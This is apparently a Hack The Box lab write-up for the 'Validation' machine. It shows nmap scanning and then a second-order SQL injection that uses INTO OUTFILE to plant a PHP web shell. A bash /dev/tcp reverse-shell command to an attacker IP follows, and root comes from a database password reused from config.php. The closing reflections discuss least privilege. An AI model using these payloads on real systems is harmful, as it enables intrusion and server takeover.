---
title: "Validation Walkthrough - HTB Easy | Second-Order SQL Injection & Password Reuse"
description: "Complete walkthrough of Validation from Hack The Box. Covers exploiting a web application vulnerable to second-order SQL Injection to write a PHP web shell into the system for Remote Code Execution (RCE). After initial access, privilege escalation is achieved by exploiting database password reuse, leading to root-level access on the machine."
author: dua2z3rr
date: 2025-10-20 1:00:00
categories: ["HackTheBox", "Machines"]
tags: ["web-application", "injections", "sql-injection", "misconfiguration", "mysql", "reconnaissance"]
image: /assets/img/validation/validation-resized.png
---

## Overview

Validation is an Easy Difficulty Linux machine that features a web application susceptible to a second-order SQL Injection. Capitalizing on this vulnerability, an attacker can inscribe a web shell into the system, leading to Remote Code Execution ( RCE ). Following the initial foothold, privilege escalation is accomplished through the exploitation of a re-used database password, leading to root -level access to the machine.

---

## External Enumeration

### Nmap

Let's start by scanning the open or filtered ports on the machine through nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.116 -vv -p-
<SNIP>
PORT     STATE    SERVICE        REASON
22/tcp   open     ssh            syn-ack ttl 63
80/tcp   open     http           syn-ack ttl 62
4566/tcp open     kwtc           syn-ack ttl 63
5000/tcp filtered upnp           no-response
5001/tcp filtered commplex-link  no-response
5002/tcp filtered rfe            no-response
5003/tcp filtered filemaker      no-response
5004/tcp filtered avt-profile-1  no-response
5005/tcp filtered avt-profile-2  no-response
5006/tcp filtered wsm-server     no-response
5007/tcp filtered wsm-server-ssl no-response
5008/tcp filtered synapsis-edge  no-response
8080/tcp open     http-proxy     syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.116 -vv -p 22,80,4566,5000-5008,8080 -sC -sV
<SNIP>
PORT     STATE    SERVICE        REASON         VERSION
22/tcp   open     ssh            syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgSpafkjRVogAlgtxt6cFN7sU4sRTiGYC01QloBpbOwerqFUoYNyhCdNP/9rvdhwFpXomoMhDxioWQZb1RTSbR5aCwkzwDRnLz5PKN/7faaoEVjFM1vSnjGwWxzPZJw4Xy8wEbvMDlNZQbWu44UMWhLH+Vp63egRsut0SkTpUy3Ovp/yb3uAeT/4sUPG+LvDgzXD2QY+O1SV0Y3pE+pRmL3UfRKr2ltMfpcc7y7423+3oRSONHfy1upVUcUZkRIKrl9Qb4CDpxbVi/hYfAFQcOYH+IawAounkeiTMMEtOYbzDysEzVrFcCiGPWOX5+7tu4H7jYnZiel39ka/TFODVA+m2ZJiz2NoKLKTVhouVAGkH7adYtotM62JEtow8MW0HCZ9+cX6ki5cFK9WQhN++KZej2fEZDkxV7913KaIa4HCbiDq1Sfr5j7tFAWnNDo097UHXgN5A0mL1zNqwfTBCHQTEga/ztpDE0pmTKS4rkBne9EDn6GpVhSuabX9S/BLk=
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9LolyD5tnJ06EqjRR6bFX/7oOoTeFPw2TKsP1KCHJcsPSVfZIafOYEsWkaq67dsCvOdIZ8VQiNAKfnGiaBLOo=
|   256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJOP8cvEQVqCwuWYT06t/DEGxy6sNajp7CzuvfJzrCRZ
80/tcp   open     http           syn-ack ttl 62 Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4566/tcp open     http           syn-ack ttl 63 nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp           no-response
5001/tcp filtered commplex-link  no-response
5002/tcp filtered rfe            no-response
5003/tcp filtered filemaker      no-response
5004/tcp filtered avt-profile-1  no-response
5005/tcp filtered avt-profile-2  no-response
5006/tcp filtered wsm-server     no-response
5007/tcp filtered wsm-server-ssl no-response
5008/tcp filtered synapsis-edge  no-response
8080/tcp open     http           syn-ack ttl 63 nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- Ports 5000-5008 are filtered, leaving 4 open ports
- 3 of the open ports are HTTP services
- Port 22: **SSH** (OpenSSH 8.2p1)
- Port 80: **HTTP** running **Apache httpd 2.4.48**
- Port 4566: **HTTP** running **nginx**
- Port 8080: **HTTP** running **nginx**
- Linux machine

---

## Web Application Analysis

### HTTP Service (Port 80)

Let's access port 80.

![Validation homepage](/assets/img/validation/validation-homepage.png)

Let's activate Burp Suite's reverse proxy and see what requests this page sends.

![Admin registration](/assets/img/validation/validation-admin-registration.png)

```text
POST / HTTP/1.1
Host: 10.10.11.116
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.116
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.116/
Accept-Encoding: gzip, deflate, br
Cookie: user=21232f297a57a5a743894a0e4a801fc3
Connection: keep-alive

username=admin&country=Brazil
```

In the above request, captured with Burp Suite, we find the field `user=21232f297a57a5a743894a0e4a801fc3`. This is probably the hash of the admin user.

![Admin registered](/assets/img/validation/validation-admin-registered.png)

We see that the user has been registered. If we refresh the page or enter other names, we'll always see it present. This highlights the presence of a database, and therefore a possible SQL injection.

---

## SQL Injection Exploitation

### Testing for SQL Injection

Let's try inserting a single apostrophe after the country field in the above request with a new user. After doing so, we'll get an error message on the **/account.php** page:

![SQL error with apostrophe](/assets/img/validation/validation-apostrofo-country.png)

We now have certainty that SQL injection is present. Let's try to increase our **game** (cringe... I know...) with more sophisticated injections.

### Union-Based SQL Injection

```text
POST / HTTP/1.1
Host: 10.10.11.116
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.116
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.116/
Accept-Encoding: gzip, deflate, br
Cookie: user=6e6bc4e49dd477ebc98ef4046c067b5f
Connection: keep-alive

username=ciao1&country=Brazil' Union Select 1-- -
```

![First union injection](/assets/img/validation/validation-first-union.png)

Now that we know we can perform union injections, and this is a PHP application, we can use a much more specific injection to obtain a reverse shell, combining PHP and SQL.

### Writing a Web Shell via SQL Injection

```text
POST / HTTP/1.1
Host: 10.10.11.116
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.116
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.116/
Accept-Encoding: gzip, deflate, br
Cookie: user=c7cc6a1fd6d6b5f4817025cb532b52fa
Connection: keep-alive

username=ciao2&country=Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

In the response from the account.php page we get an error, but this is normal after injecting code.

```html
HTTP/1.1 200 OK
Date: Mon, 20 Oct 2025 20:12:39 GMT
Server: Apache/2.4.48 (Debian)
X-Powered-By: PHP/7.4.23
Vary: Accept-Encoding
Content-Length: 939
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
		<h1 class="text-center m-5">Join the UHC - September Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
            <h1 class="text-white">Welcome ciao2</h1><h3 class="text-white">Other Players In Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -</h3><br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/account.php</b> on line <b>33</b><br />
```

### Testing the Web Shell

Now, through **curl**, we can execute commands on the target machine within the **cmd** parameter.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $curl http://10.10.11.116/shell.php?cmd=id
admin
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Don't be fooled, we're far from being admin or a real user on the system. Admin is just the first name I entered in the database when testing. In reality, we're **www-data** (the web server).
{: .prompt-info }

---

## Initial Access

### Reverse Shell

Let's use this command to get a stable session.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $curl http://10.10.11.116/shell.php --data-urlencode 'cmd=bash -c " bash -i >& /dev/tcp/10.10.16.9/9001 0>&1"'
```

**Reverse shell obtained.**

---

## Privilege Escalation

### Internal Enumeration

As soon as we spawn the shell, we can read the **config.php** file.

```php
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

We see a password and a username.

### Root Access via Password Reuse

```shell
www-data@validation:/var/www/html$ su -    
su -
Password: uhc-9qual-global-pw
whoami
root
```

**Root flag obtained!** Box completed.

---

## Reflections

### What Surprised Me

The ability to use `INTO OUTFILE` to write arbitrary PHP code to disk through SQL injection is a powerful technique that demonstrates why database users should have minimal file system permissions. The fact that the MySQL user had write permissions to the web root directory (`/var/www/html/`) was the critical misconfiguration that made this attack possible.

### Main Mistake

I initially tried various standard SQL injection payloads to extract database credentials before realizing I could write files directly to the web directory. I should have immediately tested for `INTO OUTFILE` capabilities once I confirmed the SQL injection vulnerability, especially given that the application was running PHP on Apache.

### Alternative Approaches

For initial access, instead of writing a web shell, I could have:
1. Used `INTO OUTFILE` to write an SSH public key to a user's authorized_keys file (if permissions allowed)
2. Extracted database credentials through UNION-based injection and looked for password reuse
3. Written a more sophisticated PHP backdoor with additional functionality

### Open Question

The MySQL `FILE` privilege allows reading and writing files on the server filesystem, which essentially gives an attacker who compromises the database account the same level of access as RCE. Should web application frameworks automatically warn developers when database connections are configured with excessive privileges? The principle of least privilege suggests database users for web applications should only have SELECT, INSERT, UPDATE, and DELETE permissions on specific tables, never FILE or administrative privileges.

---

**Completed this box? What was your SQL injection payload?** Leave a comment down below!
